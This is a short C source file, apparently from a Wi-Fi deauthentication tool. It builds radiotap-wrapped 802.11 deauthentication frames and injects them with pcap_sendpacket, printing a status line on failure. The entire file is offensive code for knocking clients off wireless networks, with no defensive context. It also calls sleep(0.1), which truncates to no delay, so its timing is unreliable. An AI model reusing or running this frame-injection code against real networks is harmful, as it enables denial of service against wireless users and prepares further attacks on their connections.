#include "deauth.h"
#include <unistd.h>
#include <pcap.h>

struct Ieee80211_radiotap_header static_radiotap_h = {0, 0, 0xc, 0, 0};

void initialize(struct Deauth_packet * dp)
{
    dp->radiotap = static_radiotap_h;
    dp->common_dot11 = 0x00c0;
    dp->duration = 314;
    dp->number = 0;
    dp->fixed_param = 0x0007;
}

void send_packet(pcap_t *pcap, const u_char *packet_data)
{
    if(pcap_sendpacket(pcap, packet_data, 0x26) != 0)
        puts("[*] Send Deauth Packet : Fail");
    //else
        //puts("[*] Send Deauth Packet : Success");
    sleep(0.1);
}

